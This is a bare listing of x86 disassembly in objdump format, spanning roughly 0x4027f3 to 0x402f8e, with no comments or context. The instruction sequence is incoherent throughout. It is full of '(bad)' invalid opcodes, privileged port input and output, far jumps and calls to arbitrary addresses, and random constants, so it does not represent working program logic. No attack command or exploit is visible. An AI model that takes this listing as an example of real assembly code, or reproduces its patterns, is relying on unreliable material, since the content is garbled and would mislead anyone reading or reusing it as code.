  4027f3:	xchg   ebp,eax
  4027f4:	sti    
  4027f5:	ins    DWORD PTR es:[edi],dx
  4027f6:	das    
  4027f7:	rcl    BYTE PTR [edi-0x34e04fcf],0x9b
  4027fe:	retf   
  4027ff:	mov    ebx,0xc2c06374
  402804:	leave  
  402805:	xchg   ebp,eax
  402806:	mov    ebx,DWORD PTR [ecx+0x386166fd]
  40280c:	sbb    DWORD PTR [ecx],ebx
  40280e:	sub    ax,0xc3c3
  402812:	ds aaa 
  402814:	daa    
  402815:	push   ds
  402816:	rol    bl,1
  402818:	test   al,0xd2
  40281a:	xchg   ebp,eax
  40281b:	call   0x76ce3e4d
  402820:	data16 loop 0x4027f7
  402823:	es out 0xd2,eax
  402826:	aam    0x16
  402828:	stc    
  402829:	inc    eax
  40282a:	push   0xa094ff36
  40282f:	scas   al,BYTE PTR es:[edi]
  402830:	adc    al,0x1
  402832:	test   BYTE PTR [edi-0x7d],ah
  402835:	lea    edx,[esi-0x3a87c049]
  40283b:	rol    BYTE PTR [edi+ebp*2+0x6],cl
  40283f:	xchg   esi,eax
  402840:	(bad)  
  402841:	repz rcl eax,1
  402844:	fwait
  402845:	in     al,0x78
  402847:	mov    cl,0x7
  402849:	aam    0xba
  40284b:	jge    0x402853
  40284d:	call   0x351d:0x7f59b3d1
  402854:	jmp    0x5ec5:0x96bfe17a
  40285b:	cmp    DWORD PTR [ecx+edi*2],ecx
  40285e:	inc    esp
  40285f:	int3   
  402860:	fs xchg ebp,eax
  402862:	cmp    DWORD PTR [eax+0x3b463527],esp
  402868:	sub    eax,0xcbdbcd74
  40286d:	fidiv  WORD PTR [edi+0x355829e1]
  402873:	lods   al,BYTE PTR ds:[esi]
  402874:	dec    eax
  402875:	mov    ds:0x6cfa4eaa,eax
  40287a:	xor    ah,dl
  40287c:	xor    al,0x6
  40287e:	cld    
  40287f:	mov    cl,0xf4
  402881:	dec    esp
  402882:	in     al,0xe
  402884:	ds das 
  402886:	fucomi st,st(1)
  402888:	xor    eax,0xf46fbfdf
  40288d:	pushf  
  40288e:	fidiv  WORD PTR [edi]
  402890:	sub    ecx,edi
  402892:	lods   al,BYTE PTR ds:[esi]
  402893:	cmp    eax,esi
  402895:	push   edx
  402896:	add    eax,0xfbcda4e0
  40289b:	push   ss
  40289c:	mul    ebx
  40289e:	xor    BYTE PTR [esi-0x6466a5a0],dh
  4028a4:	pop    ebx
  4028a5:	ficom  DWORD PTR [ebx-0x56c8fdbc]
  4028ab:	and    eax,0xfd906238
  4028b0:	xor    ecx,DWORD PTR [ebp-0x7a]
  4028b3:	sbb    eax,0xb603f4f0
  4028b8:	in     eax,0x3f
  4028ba:	push   es
  4028bb:	mov    ch,0x50
  4028bd:	mov    edi,0xcbecc98d
  4028c2:	rcl    DWORD PTR [eax+0x7a],cl
  4028c5:	mov    al,ds:0xf7710d58
  4028ca:	popa   
  4028cb:	dec    esi
  4028cc:	jo     0x402946
  4028ce:	outs   dx,DWORD PTR ds:[esi]
  4028cf:	rcr    BYTE PTR [ebx+edx*8],1
  4028d2:	jge    0x4028fc
  4028d4:	or     BYTE PTR [esi],al
  4028d6:	mov    ebx,0xea0d7a35
  4028db:	popf   
  4028dc:	mov    cs,WORD PTR [edx]
  4028de:	jo     0x4028d6
  4028e0:	cld    
  4028e1:	idiv   BYTE PTR [esi+0x380a6d6]
  4028e7:	addr16 iret 
  4028e9:	cwde   
  4028ea:	jle    0x4028b9
  4028ec:	addr16 jb 0x402907
  4028ef:	mov    bl,0x46
  4028f1:	dec    ebp
  4028f2:	inc    esi
  4028f3:	cld    
  4028f4:	and    DWORD PTR [edx-0x3fca9d2a],esp
  4028fa:	mov    edi,0x300f1c43
  4028ff:	push   es
  402900:	xchg   esp,eax
  402901:	sahf   
  402902:	packssdw mm3,QWORD PTR [edi*8-0x7847267c]
  40290a:	js     0x40294a
  40290c:	aam    0x3b
  40290e:	or     eax,DWORD PTR [ebp-0x325f82fa]
  402914:	jae    0x402915
  402916:	mov    edi,0x87ba57f5
  40291b:	push   es
  40291c:	call   0xa031d02d
  402921:	sar    BYTE PTR [ebx+0x122f79b4],0x56
  402928:	leave  
  402929:	test   eax,0x416ce4a4
  40292e:	sub    al,0x6e
  402930:	leave  
  402931:	in     eax,0x5c
  402933:	comiss xmm3,DWORD PTR [ebx+0x9a4dbbf]
  40293a:	aaa    
  40293b:	push   ebx
  40293c:	mov    ds:0x3a3f1761,al
  402941:	int    0x11
  402943:	sub    ecx,eax
  402945:	push   edx
  402946:	jge    0x402982
  402948:	jmp    0xc0646050
  40294d:	lock (bad) 
  40294f:	adc    DWORD PTR [edx+0x56],esi
  402952:	push   cs
  402953:	dec    esi
  402954:	inc    esp
  402955:	xor    eax,DWORD PTR [eax+eax*2]
  402958:	call   0xb722:0x197c05bc
  40295f:	test   edi,0x85e8223d
  402965:	bound  esp,QWORD PTR [edx-0x68]
  402968:	xor    DWORD PTR [edi+0x26e5efe3],edx
  40296e:	mov    eax,0xd4041d60
  402973:	out    0x9a,al
  402975:	pop    es
  402976:	cmp    DWORD PTR [ebx],esi
  402978:	loope  0x402907
  40297a:	mov    al,ds:0xaf518914
  40297f:	fnclex 
  402981:	mov    ?,WORD PTR [ecx+0x36f5554e]
  402987:	xchg   DWORD PTR [edx],edx
  402989:	popa   
  40298a:	lock pop es
  40298c:	mov    esp,0x863af217
  402991:	mov    ecx,0x59dfc206
  402996:	cli    
  402997:	push   esi
  402998:	mov    ah,BYTE PTR [ecx]
  40299a:	push   DWORD PTR [ebp+0x50]
  40299d:	cwde   
  40299e:	jle    0x4029d5
  4029a0:	fistp  DWORD PTR [ebp+edi*8-0x704f9e73]
  4029a7:	jecxz  0x4029d6
  4029a9:	leave  
  4029aa:	sub    eax,0xd48a2398
  4029af:	xchg   ecx,eax
  4029b0:	pop    edi
  4029b1:	jno    0x4029d1
  4029b3:	cmp    ebx,DWORD PTR [ebx+0x68]
  4029b6:	sbb    BYTE PTR [edi+0x2c],bl
  4029b9:	into   
  4029ba:	mov    ds:0xdb83edb3,eax
  4029bf:	fdiv   QWORD PTR [edx+0x3f]
  4029c2:	push   0x16
  4029c4:	pop    esi
  4029c5:	mov    ah,0x60
  4029c7:	rcl    BYTE PTR [ecx+0x8],1
  4029ca:	xor    BYTE PTR [ecx+0x23],bh
  4029cd:	ret    
  4029ce:	mov    edi,ebp
  4029d0:	mov    edx,0xd29990f8
  4029d5:	sub    DWORD PTR [ecx-0x23],edi
  4029d8:	outs   dx,BYTE PTR ds:[esi]
  4029d9:	push   ebx
  4029da:	das    
  4029db:	cmp    eax,0xaf414d27
  4029e0:	jmp    0x660f:0x8732be66
  4029e7:	je     0x4029b2
  4029e9:	or     ch,BYTE PTR [eax]
  4029eb:	pop    edi
  4029ec:	inc    ecx
  4029ed:	and    al,BYTE PTR [eax-0x45028b71]
  4029f3:	pop    esp
  4029f4:	mov    dl,0x2f
  4029f6:	pop    ebx
  4029f7:	pop    es
  4029f8:	dec    esi
  4029f9:	lods   eax,DWORD PTR ds:[esi]
  4029fa:	inc    edi
  4029fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029fd:	out    0xc9,eax
  4029ff:	pop    ss
  402a00:	in     eax,dx
  402a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a02:	cld    
  402a03:	ss pop es
  402a05:	loop   0x4029ad
  402a07:	inc    edx
  402a08:	imul   ecx,DWORD PTR [eax],0xffffffe5
  402a0b:	mov    eax,ds:0xc2d0318
  402a10:	scas   al,BYTE PTR es:[edi]
  402a11:	fwait
  402a12:	mov    edx,0xb41a49e4
  402a17:	sbb    bh,BYTE PTR [esi+0x7]
  402a1a:	inc    esp
  402a1b:	sbb    ah,al
  402a1d:	out    dx,eax
  402a1e:	jbe    0x402a8f
  402a20:	shr    BYTE PTR [esi+0x2c3649a5],0xa0
  402a27:	pop    edx
  402a28:	aam    0x3f
  402a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a2b:	in     eax,dx
  402a2c:	aas    
  402a2d:	stos   DWORD PTR es:[edi],eax
  402a2e:	jno    0x402a54
  402a30:	ret    0xe399
  402a33:	mov    ecx,0x39a9473
  402a38:	inc    esi
  402a39:	sar    bh,0xa
  402a3c:	cmp    bl,BYTE PTR [ebp+0x614645a4]
  402a42:	cmc    
  402a43:	fdivr  QWORD PTR [edi]
  402a45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a47:	outs   dx,BYTE PTR ds:[esi]
  402a48:	outs   dx,DWORD PTR ds:[esi]
  402a49:	dec    BYTE PTR ds:0x9764195
  402a4f:	out    0xfc,eax
  402a51:	lods   al,BYTE PTR ds:[esi]
  402a52:	fwait
  402a53:	mov    bl,0xc0
  402a55:	pop    edi
  402a56:	push   eax
  402a58:	mov    ds,WORD PTR ds:[edx]
  402a5b:	in     eax,0x58
  402a5d:	in     eax,0x66
  402a5f:	inc    ecx
  402a60:	inc    edi
  402a61:	add    DWORD PTR [eax],0x60d271ac
  402a67:	neg    DWORD PTR [ebx+ecx*1+0x380be936]
  402a6e:	mov    edx,0xd63aa7e6
  402a73:	ins    DWORD PTR es:[edi],dx
  402a74:	mov    eax,0x49b82cd8
  402a79:	jmp    0x452e8e3a
  402a7e:	jl     0x402a3d
  402a80:	mov    dl,0x63
  402a82:	jns    0x402a91
  402a84:	jp     0x402a84
  402a86:	pop    edi
  402a87:	mov    edx,DWORD PTR [esi+0x5b]
  402a8a:	and    eax,DWORD PTR [ecx]
  402a8c:	push   eax
  402a8d:	int    0xb6
  402a8f:	sbb    DWORD PTR [ebx-0x78],ecx
  402a92:	xchg   BYTE PTR [edi],bl
  402a94:	aad    0xad
  402a96:	xchg   DWORD PTR [ebp+0x24b60702],esp
  402a9c:	call   0x1206:0xa184a7c5
  402aa3:	mov    al,0x8b
  402aa5:	or     ah,ch
  402aa7:	pop    ss
  402aa8:	push   ecx
  402aa9:	and    BYTE PTR [ebp+esi*4-0x5],bh
  402aad:	or     BYTE PTR [edi],cl
  402aaf:	and    edx,esp
  402ab1:	cs (bad) 
  402ab4:	mov    eax,ecx
  402ab6:	jnp    0x402a55
  402ab8:	push   ecx
  402ab9:	cmp    DWORD PTR [ecx],edi
  402abb:	inc    eax
  402abc:	jp     0x402b10
  402abe:	mov    esp,0xfe4dee66
  402ac3:	dec    edi
  402ac4:	push   edx
  402ac5:	lds    esp,FWORD PTR [ebp-0x4ee4d26]
  402acb:	test   DWORD PTR [esi],0xea57b6f4
  402ad1:	ds arpl WORD PTR ds:[ecx+edi*1-0x8],dx
  402ad7:	push   ecx
  402ad8:	outs   dx,BYTE PTR ds:[esi]
  402ad9:	pop    ss
  402ada:	ss jl  0x402a93
  402add:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ade:	ud2    
  402ae0:	sub    esi,DWORD PTR [ebp+0x79758500]
  402ae6:	test   DWORD PTR ds:[esi+ecx*4-0x2d447abe],edi
  402aee:	jbe    0x402b12
  402af0:	jmp    0xac17:0x69d396b4
  402af7:	fdiv   DWORD PTR [esi+eax*4]
  402afa:	sub    DWORD PTR [edi],ebp
  402afc:	mov    WORD PTR [esi+0x4ef56189],ss
  402b02:	sub    ecx,DWORD PTR [eax+0x70]
  402b05:	inc    eax
  402b06:	jle    0x402afd
  402b08:	inc    edx
  402b09:	mov    ch,ch
  402b0b:	inc    eax
  402b0c:	lods   eax,DWORD PTR ds:[esi]
  402b0d:	ja     0x402a9b
  402b0f:	mov    esi,0x122ff860
  402b14:	in     eax,0x6d
  402b16:	push   ds
  402b17:	and    DWORD PTR [ecx+0x2b],edi
  402b1a:	cwde   
  402b1b:	lods   eax,DWORD PTR ds:[esi]
  402b1c:	pop    ss
  402b1d:	scas   al,BYTE PTR es:[edi]
  402b1e:	jae    0x402b8f
  402b20:	mov    al,ds:0xb6861451
  402b25:	pop    ecx
  402b26:	mov    al,0xb4
  402b28:	push   0xffffffe0
  402b2a:	ror    dh,0x2e
  402b2d:	hlt    
  402b2e:	out    0xf8,al
  402b30:	mov    esp,0xf81d1b7f
  402b35:	sahf   
  402b36:	xor    eax,0xc6fac236
  402b3b:	iret   
  402b3c:	arpl   WORD PTR ds:0xa53e3656,bp
  402b42:	pop    ss
  402b43:	out    0xc1,eax
  402b45:	sub    eax,0x4714e8c
  402b4a:	(bad)  
  402b4b:	cld    
  402b4c:	je     0x402b2f
  402b4e:	stc    
  402b4f:	pop    ebp
  402b50:	or     al,0x64
  402b52:	je     0x402af5
  402b54:	or     BYTE PTR [ecx],cl
  402b56:	iret   
  402b57:	xchg   DWORD PTR [ecx],ebp
  402b59:	lea    edi,[edx]
  402b5b:	(bad)  
  402b5c:	(bad)  
  402b5d:	sub    edx,DWORD PTR [ecx-0x49c4bb24]
  402b63:	xor    eax,0xb9d30ae1
  402b68:	rcl    DWORD PTR [esi-0x75c28869],cl
  402b6e:	adc    BYTE PTR [ebx-0x14ae7d6e],bl
  402b74:	xor    bh,BYTE PTR [edi-0x3fb58088]
  402b7a:	(bad)  
  402b7b:	fstp   DWORD PTR [ebp-0x5e]
  402b7e:	xchg   ebp,eax
  402b7f:	and    DWORD PTR [ebp+0x30],edx
  402b82:	xchg   esp,eax
  402b83:	push   esi
  402b84:	sbb    dl,dh
  402b86:	xor    ebp,DWORD PTR [edx]
  402b88:	outs   dx,BYTE PTR ds:[esi]
  402b89:	mov    bh,0xbb
  402b8b:	ds in  eax,0xf7
  402b8e:	test   eax,0x4521c3f0
  402b93:	or     DWORD PTR [edi-0x33a971da],esp
  402b99:	xchg   edi,eax
  402b9a:	push   ds
  402b9b:	jmp    0xd5a5:0xe8119f52
  402ba2:	lock dec edx
  402ba4:	es ins BYTE PTR es:[edi],dx
  402ba6:	mov    ebx,0xba1e72f4
  402bab:	or     DWORD PTR [ebx+0x49],edi
  402bae:	sbb    BYTE PTR [edi+eax*2+0x7c],ah
  402bb2:	mov    dh,ch
  402bb4:	xor    ebp,DWORD PTR [esi-0x77]
  402bb7:	mov    edi,0x8bbe21d0
  402bbc:	jns    0x402b47
  402bbe:	lahf   
  402bbf:	xchg   ebx,eax
  402bc0:	mov    WORD PTR [edx+0x37],?
  402bc3:	inc    ebx
  402bc4:	and    eax,0x93f16327
  402bc9:	outs   dx,BYTE PTR ds:[esi]
  402bca:	xor    ecx,ecx
  402bcc:	push   ebp
  402bcd:	aas    
  402bce:	pop    edx
  402bcf:	mov    esp,0x9f757eaf
  402bd4:	test   al,0x24
  402bd6:	inc    esi
  402bd7:	repz sub BYTE PTR [ebp+0x41],0x4b
  402bdc:	jge    0x402b79
  402bde:	das    
  402bdf:	mov    esi,0x6e220d6e
  402be4:	mov    ds:0x4b5c9bc8,al
  402be9:	mov    BYTE PTR [ecx+0x637d1d7e],ch
  402bef:	mov    BYTE PTR [edi-0x7969cf9e],cl
  402bf5:	cmp    al,0x92
  402bf7:	cmc    
  402bf8:	cwde   
  402bf9:	dec    esp
  402bfa:	dec    edi
  402bfb:	repnz pushf 
  402bfd:	dec    edx
  402bfe:	retf   
  402bff:	push   es
  402c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c01:	inc    edi
  402c02:	adc    eax,0x21aee2ae
  402c07:	hlt    
  402c08:	mov    ebx,0x1f9df6f8
  402c0d:	jmp    0x402bec
  402c0f:	into   
  402c10:	stos   BYTE PTR es:[edi],al
  402c11:	jp     0x402c6f
  402c13:	imul   esi,DWORD PTR [eax+esi*4-0x7ad2dcb9],0x4df3e636
  402c1e:	push   eax
  402c1f:	dec    eax
  402c20:	ror    ecx,1
  402c22:	retf   
  402c23:	jge    0x402c81
  402c25:	test   BYTE PTR [edx+0x779305c8],0xd8
  402c2c:	stos   DWORD PTR es:[edi],eax
  402c2d:	pop    ebp
  402c2e:	pop    edx
  402c2f:	xchg   BYTE PTR [ebx],dl
  402c31:	sub    dh,BYTE PTR [ebx-0x62fb5d28]
  402c37:	sub    dl,BYTE PTR [eax+edx*8]
  402c3a:	fwait
  402c3b:	int    0x8d
  402c3d:	xchg   ebp,eax
  402c3e:	adc    bh,BYTE PTR [edx+0x35b0508]
  402c44:	hlt    
  402c45:	dec    esi
  402c46:	mov    ecx,0xf7b4f3cd
  402c4b:	or     eax,0x2f34dfd9
  402c50:	xchg   edi,eax
  402c51:	jmp    0x6a471061
  402c56:	cwde   
  402c57:	xchg   ebp,eax
  402c58:	xchg   ebp,eax
  402c59:	xchg   edx,eax
  402c5a:	and    eax,0x22dbf4e0
  402c5f:	jno    0x402cdf
  402c61:	dec    esp
  402c62:	scas   eax,DWORD PTR es:[edi]
  402c63:	cmp    BYTE PTR ds:0xb533c65d,bl
  402c69:	leave  
  402c6a:	pop    edx
  402c6b:	out    dx,eax
  402c6c:	gs pop esp
  402c6e:	ds aam 0xe2
  402c71:	or     eax,0x3e6995ec
  402c76:	mov    ah,0x73
  402c78:	data16 jecxz 0x402c9f
  402c7b:	cli    
  402c7c:	pop    edi
  402c7d:	ret    0x78e7
  402c80:	adc    ecx,DWORD PTR [eax]
  402c82:	sti    
  402c83:	jmp    0x402c12
  402c85:	icebp  
  402c86:	pop    ds
  402c87:	nop
  402c88:	pop    eax
  402c89:	bound  ebx,QWORD PTR [edx]
  402c8b:	je     0x402cbf
  402c8d:	or     ebx,esi
  402c8f:	cld    
  402c90:	adc    al,0x59
  402c92:	in     eax,0x68
  402c94:	cmp    ch,BYTE PTR [ecx-0x62]
  402c97:	lock lods eax,DWORD PTR ds:[esi]
  402c99:	cmp    ecx,DWORD PTR [edx]
  402c9b:	test   DWORD PTR [edx+0x66],edi
  402c9e:	and    DWORD PTR [edx+0x71],esp
  402ca1:	je     0x402cdb
  402ca3:	ret    
  402ca4:	push   edx
  402ca5:	xchg   DWORD PTR [edx-0x1d],ebp
  402ca8:	mov    bl,0xba
  402caa:	cmp    BYTE PTR [esi-0x6d],bl
  402cad:	mov    al,ds:0xbf1e3294
  402cb2:	mov    dl,0xeb
  402cb4:	in     al,dx
  402cb5:	dec    esp
  402cb6:	repnz sahf 
  402cb8:	jno    0x402d0d
  402cba:	push   DWORD PTR [eax+eax*4-0xba0eb70]
  402cc1:	es or  esi,edx
  402cc4:	fidivr DWORD PTR ds:0xbb70b39
  402cca:	cmp    al,0xa3
  402ccc:	imul   ecx,ecx,0x37
  402ccf:	inc    ebx
  402cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd1:	jl     0x402ce9
  402cd3:	sbb    al,0x2f
  402cd5:	loop   0x402cbf
  402cd7:	mov    al,ds:0x22fd8386
  402cdc:	mov    esi,0xb9b9ddae
  402ce1:	xchg   ebp,eax
  402ce2:	mov    ch,0x12
  402ce4:	and    DWORD PTR [ebx+eiz*8+0x6a],esp
  402ce8:	push   ebp
  402ce9:	rcl    DWORD PTR [edx],0xa1
  402cec:	jmp    DWORD PTR [eax-0x11]
  402cef:	sub    esi,DWORD PTR [edx]
  402cf1:	daa    
  402cf2:	das    
  402cf3:	xchg   ebp,eax
  402cf4:	fidivr WORD PTR [edx+0x15bbf66c]
  402cfa:	xchg   edi,eax
  402cfb:	mov    ebp,0xf0788c8
  402d00:	fsubr  DWORD PTR [ecx]
  402d02:	cmp    al,0x12
  402d04:	bound  esi,QWORD PTR [edi+0x6a]
  402d07:	or     BYTE PTR [ebx+0x15ce6c8a],cl
  402d0d:	clc    
  402d0e:	ins    BYTE PTR es:[edi],dx
  402d0f:	xor    al,0x66
  402d11:	shr    DWORD PTR [ecx-0x7f],0xfd
  402d15:	inc    ebp
  402d16:	test   BYTE PTR [edx],al
  402d18:	cli    
  402d19:	adc    edx,ebx
  402d1b:	outs   dx,BYTE PTR ds:[esi]
  402d1c:	lds    edx,FWORD PTR [edx]
  402d1e:	sti    
  402d1f:	test   DWORD PTR es:[esi],eax
  402d22:	jbe    0x402d37
  402d24:	rcr    BYTE PTR [ebx],0x87
  402d27:	mov    edx,0x160e316c
  402d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d2d:	loopne 0x402da0
  402d2f:	push   edi
  402d30:	xlat   BYTE PTR ds:[ebx]
  402d31:	clc    
  402d32:	fsubp  st(5),st
  402d34:	je     0x402d12
  402d36:	xor    DWORD PTR [edi-0x6e],ebx
  402d39:	add    al,0x25
  402d3b:	push   edx
  402d3c:	retf   
  402d3d:	jae    0x402d21
  402d3f:	push   eax
  402d40:	ja     0x402cd5
  402d42:	push   eax
  402d43:	in     al,0x82
  402d45:	jne    0x402d55
  402d47:	or     BYTE PTR [ebx+0x16],0x6
  402d4b:	add    eax,esi
  402d4d:	leave  
  402d4e:	int    0x87
  402d50:	movups xmm7,XMMWORD PTR [edi]
  402d53:	push   esi
  402d54:	mov    dh,0x10
  402d56:	in     al,0x67
  402d58:	ins    DWORD PTR es:[edi],dx
  402d59:	fwait
  402d5a:	loopne 0x402d9f
  402d5c:	add    eax,DWORD PTR [edx-0x25]
  402d5f:	cs iret 
  402d61:	mov    edx,0x1d462a2
  402d66:	outs   dx,BYTE PTR ds:[esi]
  402d67:	xchg   esp,eax
  402d68:	dec    ebx
  402d69:	add    al,0xad
  402d6b:	mov    ecx,DWORD PTR [edi+0x15]
  402d6e:	or     DWORD PTR [ebx],esi
  402d70:	jle    0x402d86
  402d72:	es mov bh,0x56
  402d75:	push   0x7849fae7
  402d7a:	stos   BYTE PTR es:[edi],al
  402d7b:	lods   al,BYTE PTR ds:[esi]
  402d7c:	sti    
  402d7d:	mov    ch,0xba
  402d7f:	mov    bl,0x5a
  402d81:	repz mov cs:0x7f5288b,eax
  402d88:	dec    ecx
  402d89:	mov    ebx,0xce473291
  402d8e:	lahf   
  402d8f:	fsubp  st(4),st
  402d91:	cmp    BYTE PTR [edi],0x64
  402d94:	and    bl,bl
  402d96:	add    eax,0x76a9cb59
  402d9b:	lock (bad) 
  402d9d:	je     0x402d46
  402d9f:	mov    al,0x6a
  402da1:	out    0xe6,eax
  402da3:	cs push edx
  402da5:	int    0x7f
  402da7:	cmp    al,BYTE PTR ds:0x7b39a43b
  402dad:	mov    edi,0x6a9b532b
  402db2:	test   DWORD PTR [ebp-0x79678fe2],0x89a8e813
  402dbc:	je     0x402d83
  402dbe:	out    0xd8,eax
  402dc0:	xchg   ecx,eax
  402dc1:	inc    DWORD PTR [ebx+ebp*1+0x1db2ac31]
  402dc8:	rol    DWORD PTR [eax],1
  402dca:	inc    esi
  402dcb:	loopne 0x402d5e
  402dcd:	jns    0x402db0
  402dcf:	mov    ecx,0x1ffe068a
  402dd4:	mov    ds:0x8bd35f1e,al
  402dd9:	pop    ds
  402dda:	pop    ds
  402ddb:	ss clc 
  402ddd:	push   edi
  402dde:	mov    ah,BYTE PTR [ecx]
  402de0:	test   BYTE PTR [ebx],cl
  402de2:	dec    ebx
  402de3:	mov    DWORD PTR [esi],esi
  402de5:	leave  
  402de6:	mov    edx,0x85c0f6ad
  402deb:	mov    DWORD PTR [eax+0x5ffc3b3a],ebp
  402df1:	pushf  
  402df2:	dec    eax
  402df3:	cmp    al,0xdb
  402df5:	adc    DWORD PTR [edx+0x41],ebp
  402df8:	in     al,dx
  402df9:	xlat   BYTE PTR ds:[ebx]
  402dfa:	sahf   
  402dfb:	shl    BYTE PTR [edi+0x3f],1
  402dfe:	cli    
  402dff:	fsqrt  
  402e01:	push   ecx
  402e02:	jns    0x402da7
  402e04:	test   eax,0xf6c86cd1
  402e09:	xchg   BYTE PTR [ebx],bh
  402e0b:	sti    
  402e0c:	mov    ebp,0xc3bf81a0
  402e11:	sbb    al,0xf8
  402e13:	sub    ebp,esi
  402e15:	in     eax,dx
  402e16:	pop    eax
  402e17:	jecxz  0x402dda
  402e19:	int3   
  402e1a:	xor    BYTE PTR [edi-0x329ad24f],ah
  402e20:	mov    edx,0x34bacf66
  402e25:	lock sbb eax,0xb1a4ba26
  402e2b:	mov    esp,DWORD PTR [ecx]
  402e2d:	aam    0x57
  402e2f:	int3   
  402e30:	popa   
  402e31:	out    0xe7,al
  402e33:	xlat   BYTE PTR ds:[ebx]
  402e34:	je     0x402e49
  402e36:	mov    eax,0x879e6cae
  402e3b:	push   0xed152163
  402e40:	xlat   BYTE PTR ds:[ebx]
  402e41:	mov    ah,BYTE PTR [ebp+0x493a86b]
  402e47:	cmp    ch,BYTE PTR [edx]
  402e49:	cld    
  402e4a:	dec    ebx
  402e4b:	out    dx,eax
  402e4c:	(bad)  
  402e4d:	fcom   QWORD PTR [ebp-0x72eac9fb]
  402e53:	cmp    ch,BYTE PTR [esi]
  402e55:	jne    0x402e82
  402e57:	sahf   
  402e58:	retf   
  402e59:	pop    esi
  402e5a:	inc    edx
  402e5b:	inc    ebx
  402e5c:	xchg   DWORD PTR [esi+0x4daac5cc],edi
  402e62:	out    0x3c,al
  402e64:	(bad)  
  402e65:	mov    BYTE PTR [ebp-0x17246c9a],bl
  402e6b:	mov    dl,0x49
  402e6d:	sub    al,0xb7
  402e6f:	sub    DWORD PTR [ecx],0x15413223
  402e75:	mov    esp,0xc5c8ea8d
  402e7a:	cmp    al,0xf7
  402e7c:	jge    0x402e4d
  402e7e:	outs   dx,DWORD PTR ds:[esi]
  402e7f:	(bad)  
  402e80:	out    0xc5,eax
  402e82:	xchg   DWORD PTR [edx+0x51b92621],edi
  402e88:	add    BYTE PTR [ecx+edi*1],dl
  402e8b:	and    edi,esi
  402e8d:	stc    
  402e8e:	jmp    0x59b81b4d
  402e93:	and    ebp,esp
  402e95:	out    0x7a,al
  402e97:	push   ebx
  402e98:	test   BYTE PTR [ebx+0x229d04a6],bl
  402e9e:	push   ecx
  402e9f:	lods   al,BYTE PTR ds:[esi]
  402ea0:	stos   DWORD PTR es:[edi],eax
  402ea1:	in     al,dx
  402ea2:	jl     0x402eb0
  402ea4:	or     al,0x8a
  402ea6:	mov    al,ds:0x12932831
  402eab:	mul    DWORD PTR [ebp+ecx*1+0x56]
  402eaf:	inc    ebx
  402eb0:	add    edx,DWORD PTR [ebp-0x2a]
  402eb3:	ds mov dl,0x5a
  402eb6:	frstor [eax]
  402eb8:	mov    ds:0x1b1787ae,al
  402ebd:	push   ss
  402ebe:	(bad)  
  402ebf:	ss (bad) 
  402ec1:	imul   ecx,DWORD PTR [ebp-0x415b0c1c],0x57
  402ec8:	outs   dx,BYTE PTR ds:[esi]
  402ec9:	xchg   esi,eax
  402eca:	hlt    
  402ecb:	aam    0xd5
  402ecd:	cmp    al,0x7c
  402ecf:	pop    ss
  402ed0:	mov    dh,BYTE PTR [ebp-0x36]
  402ed3:	js     0x402f44
  402ed5:	xchg   esi,eax
  402ed6:	ror    BYTE PTR [ecx+0x68d4ac94],1
  402edc:	scas   eax,DWORD PTR es:[edi]
  402edd:	and    DWORD PTR [eax+0x7a],ecx
  402ee0:	jne    0x402e8e
  402ee2:	out    0x4,eax
  402ee4:	jno    0x402f16
  402ee6:	xabort 0x6e
  402ee9:	loopne 0x402e8c
  402eeb:	inc    ecx
  402eec:	push   eax
  402eed:	cmp    eax,edi
  402eef:	xchg   ebx,eax
  402ef0:	xor    ecx,DWORD PTR [ebx+0x2c]
  402ef3:	retf   
  402ef4:	out    0x71,al
  402ef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ef7:	dec    esi
  402ef8:	jmp    0x605562dd
  402efd:	cmp    bl,BYTE PTR ds:0xde2e43d9
  402f03:	sub    DWORD PTR [eax-0x842d095],esp
  402f09:	or     eax,0x1e2b24ed
  402f0e:	sbb    BYTE PTR [eax+esi*4-0x37],ch
  402f12:	fisttp DWORD PTR [edx]
  402f14:	lds    ecx,FWORD PTR ds:0x9087fa1a
  402f1a:	fist   DWORD PTR ss:[esi+ecx*8]
  402f1e:	rcl    BYTE PTR [edx],0x7e
  402f21:	loop   0x402ee9
  402f23:	or     BYTE PTR [edx+0x46],bl
  402f26:	ja     0x402ef9
  402f28:	hlt    
  402f29:	dec    esp
  402f2a:	test   al,0xce
  402f2c:	ss push esp
  402f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f2f:	test   BYTE PTR [ecx-0x3ef60eca],ah
  402f35:	jae    0x402f00
  402f37:	adc    edx,DWORD PTR [edx+0x44]
  402f3a:	push   edx
  402f3b:	xlat   BYTE PTR ds:[ebx]
  402f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f3d:	in     al,0xc6
  402f3f:	dec    ebp
  402f40:	sub    dh,BYTE PTR [ebx-0x44699037]
  402f46:	retf   
  402f47:	fcmove st,st(2)
  402f49:	adc    BYTE PTR [edx],cl
  402f4b:	mov    ah,0x4f
  402f4d:	(bad)  
  402f4e:	cld    
  402f4f:	inc    eax
  402f50:	mov    al,ds:0x978eb632
  402f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f56:	lods   al,BYTE PTR ds:[esi]
  402f57:	mov    ebx,0xf1bd3a4e
  402f5c:	and    edi,0xffffffb5
  402f5f:	ficomp WORD PTR [ebx]
  402f61:	fild   QWORD PTR [ecx]
  402f63:	mov    bl,0x34
  402f65:	xchg   edi,eax
  402f66:	loopne 0x402f7d
  402f68:	adc    eax,0x8bf7a023
  402f6d:	cmp    DWORD PTR [esp+edx*8+0x6b],edx
  402f71:	jne    0x402f1c
  402f73:	sti    
  402f74:	test   DWORD PTR [edx+0x71c1958c],esi
  402f7a:	loop   0x402f4e
  402f7c:	mov    bh,0x68
  402f7e:	adc    ah,dh
  402f80:	cmp    al,0x99
  402f82:	mov    dh,0xfb
  402f84:	mov    dh,0x11
  402f86:	sbb    ch,al
  402f88:	sbb    BYTE PTR ds:0x7f64d0e0,dh
  402f8e:	es adc al,dl
